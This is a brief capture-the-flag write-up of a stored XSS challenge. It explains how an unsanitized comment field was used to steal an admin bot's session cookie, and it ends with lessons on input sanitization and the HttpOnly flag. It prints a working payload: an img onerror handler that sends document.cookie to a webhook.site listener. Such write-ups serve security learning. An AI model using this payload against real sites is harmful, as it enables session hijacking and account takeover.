#### Challenge Name
XSS - Stored 1

#### Goal  
Steal the administrator session cookie and use it to validate this chall.

#### Initial Observation  
The page contains a comment section where user input is rendered directly in the HTML without sanitization or output encoding.

#### Approach  
- Opened the page and inspected where the user input appears in the HTML source.
- Confirmed there is no input sanitization or output encoding.
- Set up a listener URL on **webhook.site** to receive the stolen cookie.
- Injected an XSS payload into the comment section: 
`<img src=0 onerror="document.location='https://webhook.site/YOUR-ID?c='+document.cookie">`
- When the admin bot visited the page, the payload executed in their browser and sent their session cookie to webhook.site.

#### Solution
- Received the admin session cookie from webhook.site.
- Used the stolen cookie in the browser to impersonate the admin.  
- This allowed the challenge to be validated.

#### What I Learned
- How Stored XSS works — payload is permanently stored on the server
- How session hijacking works in real life
- Improper input sanitization can lead to serious vulnerabilities like XSS.
- `HttpOnly` cookie flag would have prevented this attack. ( An HttpOnly cookie is a cookie that JavaScript cannot read, 
  which helps protect it from XSS attacks )
